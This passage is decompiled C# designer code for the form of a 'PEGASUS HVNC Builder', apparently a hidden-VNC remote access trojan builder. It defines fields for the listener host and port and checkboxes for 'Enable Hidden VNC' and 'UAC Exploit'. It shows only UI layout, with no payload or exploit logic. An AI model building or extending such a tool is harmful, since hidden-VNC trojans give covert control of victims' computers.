			guna2GroupBox1.Text = "c";
			label12.AutoSize = true;
			label12.BackColor = System.Drawing.Color.Transparent;
			label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label12.Location = new System.Drawing.Point(60, 11);
			label12.Name = "label12";
			label12.Size = new System.Drawing.Size(133, 16);
			label12.TabIndex = 2;
			label12.Text = "Connections Settings";
			label12.Visible = false;
			label13.AutoSize = true;
			label13.BackColor = System.Drawing.Color.Transparent;
			label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label13.Location = new System.Drawing.Point(598, 11);
			label13.Name = "label13";
			label13.Size = new System.Drawing.Size(109, 16);
			label13.TabIndex = 2;
			label13.Text = "Identifier Settings";
			label13.Visible = false;
			label11.AutoSize = true;
			label11.BackColor = System.Drawing.Color.Transparent;
			label11.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label11.Location = new System.Drawing.Point(307, 11);
			label11.Name = "label11";
			label11.Size = new System.Drawing.Size(87, 16);
			label11.TabIndex = 2;
			label11.Text = "Misc Settings";
			label11.Visible = false;
			txtIP.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIP.BorderThickness = 3;
			txtIP.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtIP.DefaultText = "IP ADDRESS";
			txtIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIP.DisabledState.Parent = txtIP;
			txtIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIP.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIP.FocusedState.Parent = txtIP;
			txtIP.Font = new System.Drawing.Font("Electrolize", 9f);
			txtIP.ForeColor = System.Drawing.Color.White;
			txtIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtIP.HoverState.Parent = txtIP;
			txtIP.Location = new System.Drawing.Point(26, 70);
			txtIP.Name = "txtIP";
			txtIP.PasswordChar = '\0';
			txtIP.PlaceholderForeColor = System.Drawing.Color.FromArgb(94, 148, 255);
			txtIP.PlaceholderText = "";
			txtIP.SelectedText = "";
			txtIP.SelectionStart = 10;
			txtIP.ShadowDecoration.Parent = txtIP;
			txtIP.Size = new System.Drawing.Size(167, 24);
			txtIP.TabIndex = 131;
			txtPORT.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtPORT.BorderThickness = 3;
			txtPORT.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtPORT.DefaultText = "1337";
			txtPORT.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtPORT.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtPORT.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtPORT.DisabledState.Parent = txtPORT;
			txtPORT.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtPORT.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtPORT.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtPORT.FocusedState.Parent = txtPORT;
			txtPORT.Font = new System.Drawing.Font("Electrolize", 9f);
			txtPORT.ForeColor = System.Drawing.Color.White;
			txtPORT.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			txtPORT.HoverState.Parent = txtPORT;
			txtPORT.Location = new System.Drawing.Point(26, 168);
			txtPORT.Name = "txtPORT";
			txtPORT.PasswordChar = '\0';
			txtPORT.PlaceholderText = "";
			txtPORT.SelectedText = "";
			txtPORT.SelectionStart = 4;
			txtPORT.ShadowDecoration.Parent = txtPORT;
			txtPORT.Size = new System.Drawing.Size(167, 24);
			txtPORT.TabIndex = 132;
			label2.AutoSize = true;
			label2.BackColor = System.Drawing.Color.Transparent;
			label2.Location = new System.Drawing.Point(23, 149);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(86, 15);
			label2.TabIndex = 130;
			label2.Text = "Port Listener :";
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Location = new System.Drawing.Point(23, 51);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(91, 15);
			label1.TabIndex = 129;
			label1.Text = "Host IP / DNS :";
			guna2CustomCheckBox1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2CustomCheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2CustomCheckBox1.CheckedState.BorderRadius = 2;
			guna2CustomCheckBox1.CheckedState.BorderThickness = 2;
			guna2CustomCheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2CustomCheckBox1.CheckedState.Parent = guna2CustomCheckBox1;
			guna2CustomCheckBox1.ForeColor = System.Drawing.Color.White;
			guna2CustomCheckBox1.Location = new System.Drawing.Point(26, 433);
			guna2CustomCheckBox1.Name = "guna2CustomCheckBox1";
			guna2CustomCheckBox1.ShadowDecoration.Parent = guna2CustomCheckBox1;
			guna2CustomCheckBox1.Size = new System.Drawing.Size(23, 23);
			guna2CustomCheckBox1.TabIndex = 126;
			guna2CustomCheckBox1.Text = "guna2CustomCheckBox1";
			guna2CustomCheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2CustomCheckBox1.UncheckedState.BorderRadius = 2;
			guna2CustomCheckBox1.UncheckedState.BorderThickness = 2;
			guna2CustomCheckBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2CustomCheckBox1.UncheckedState.Parent = guna2CustomCheckBox1;
			HiddenAccess.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			HiddenAccess.CheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			HiddenAccess.CheckedState.BorderRadius = 2;
			HiddenAccess.CheckedState.BorderThickness = 2;
			HiddenAccess.CheckedState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			HiddenAccess.CheckedState.Parent = HiddenAccess;
			HiddenAccess.ForeColor = System.Drawing.Color.White;
			HiddenAccess.Location = new System.Drawing.Point(26, 210);
			HiddenAccess.Name = "HiddenAccess";
			HiddenAccess.ShadowDecoration.Parent = HiddenAccess;
			HiddenAccess.Size = new System.Drawing.Size(23, 23);
			HiddenAccess.TabIndex = 126;
			HiddenAccess.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			HiddenAccess.UncheckedState.BorderRadius = 2;
			HiddenAccess.UncheckedState.BorderThickness = 2;
			HiddenAccess.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			HiddenAccess.UncheckedState.Parent = HiddenAccess;
			HiddenAccess.CheckedChanged += new System.EventHandler(HiddenAccess_CheckedChanged);
			label9.AutoSize = true;
			label9.BackColor = System.Drawing.Color.Transparent;
			label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label9.ForeColor = System.Drawing.Color.Gainsboro;
			label9.Location = new System.Drawing.Point(54, 438);
			label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label9.Name = "label9";
			label9.Size = new System.Drawing.Size(79, 16);
			label9.TabIndex = 81;
			label9.Text = "UAC Exploit";
			label10.AutoSize = true;
			label10.BackColor = System.Drawing.Color.Transparent;
			label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label10.ForeColor = System.Drawing.Color.Gainsboro;
			label10.Location = new System.Drawing.Point(54, 215);
			label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label10.Name = "label10";
			label10.Size = new System.Drawing.Size(129, 16);
			label10.TabIndex = 81;
			label10.Text = "Enable Hidden VNC";
			WanBtn.Animated = true;
			WanBtn.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.CheckedState.Parent = WanBtn;
			WanBtn.CustomImages.Parent = WanBtn;
			WanBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			WanBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			WanBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			WanBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			WanBtn.DisabledState.Parent = WanBtn;
			WanBtn.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			WanBtn.ForeColor = System.Drawing.Color.White;
			WanBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.HoverState.Parent = WanBtn;
			WanBtn.Location = new System.Drawing.Point(26, 101);
			WanBtn.Name = "WanBtn";
			WanBtn.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			WanBtn.ShadowDecoration.Parent = WanBtn;
			WanBtn.Size = new System.Drawing.Size(79, 24);
			WanBtn.TabIndex = 19;
			WanBtn.Text = "WAN";
			WanBtn.Click += new System.EventHandler(WanBtn_Click);
			LANBtn.Animated = true;
			LANBtn.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.CheckedState.Parent = LANBtn;
			LANBtn.CustomImages.Parent = LANBtn;
			LANBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			LANBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			LANBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			LANBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			LANBtn.DisabledState.Parent = LANBtn;
			LANBtn.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			LANBtn.ForeColor = System.Drawing.Color.White;
			LANBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.HoverState.Parent = LANBtn;
			LANBtn.Location = new System.Drawing.Point(114, 101);
			LANBtn.Name = "LANBtn";
			LANBtn.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			LANBtn.ShadowDecoration.Parent = LANBtn;
			LANBtn.Size = new System.Drawing.Size(79, 24);
			LANBtn.TabIndex = 19;
			LANBtn.Text = "LAN";
			LANBtn.Click += new System.EventHandler(LANBtn_Click);
			BuildBtn.Animated = true;
			BuildBtn.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			BuildBtn.CheckedState.Parent = BuildBtn;
			BuildBtn.CustomImages.Parent = BuildBtn;
			BuildBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			BuildBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			BuildBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			BuildBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			BuildBtn.DisabledState.Parent = BuildBtn;
			BuildBtn.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			BuildBtn.Font = new System.Drawing.Font("Electrolize", 9f);
			BuildBtn.ForeColor = System.Drawing.Color.White;
			BuildBtn.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			BuildBtn.HoverState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			BuildBtn.HoverState.Parent = BuildBtn;
			BuildBtn.Location = new System.Drawing.Point(8, 570);
			BuildBtn.Name = "BuildBtn";
			BuildBtn.PressedColor = System.Drawing.Color.FromArgb(22, 22, 22);
			BuildBtn.ShadowDecoration.Parent = BuildBtn;
			BuildBtn.Size = new System.Drawing.Size(412, 43);
			BuildBtn.TabIndex = 19;
			BuildBtn.Text = "Build Client";
			BuildBtn.Click += new System.EventHandler(button1_Click);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(430, 625);
			base.Controls.Add(guna2GroupBox1);
			base.Controls.Add(panel1);
			base.Controls.Add(BuildBtn);
			DoubleBuffered = true;
			ForeColor = System.Drawing.Color.GhostWhite;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmBuilder";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "PEGASUS HVNC Builder";
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			guna2GroupBox1.ResumeLayout(false);
			guna2GroupBox1.PerformLayout();
			ResumeLayout(false);
		}
	}
}
